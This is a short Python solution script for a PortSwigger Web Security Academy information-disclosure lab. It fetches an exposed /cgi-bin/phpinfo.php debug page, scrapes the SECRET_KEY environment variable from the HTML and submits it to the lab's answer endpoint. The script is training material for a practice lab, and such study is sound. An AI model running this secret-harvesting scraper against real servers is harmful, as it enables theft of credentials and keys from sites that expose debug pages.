import requests
from bs4 import BeautifulSoup
# Lab Url
# https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page

# Enter URL
host = input('Enter Host without "/" in the end: ')
cgi_endpoint = "/cgi-bin/phpinfo.php"
# requesting the page to get the environment variables
response = requests.get(url=host+cgi_endpoint)

# Parse the HTML
soup = BeautifulSoup(response.content, 'html.parser')

# Find the row with SECRET_KEY
secret_key_row = soup.find('td', text='SECRET_KEY ')
# Get the corresponding value
if secret_key_row:
    secret_key = secret_key_row.find_next_sibling('td').text.strip()
else:
    print('SECRET_KEY not found')

data = {'answer': secret_key}
answer_submition = f"{host}/submitSolution"
requests.post(url=answer_submition, data=data)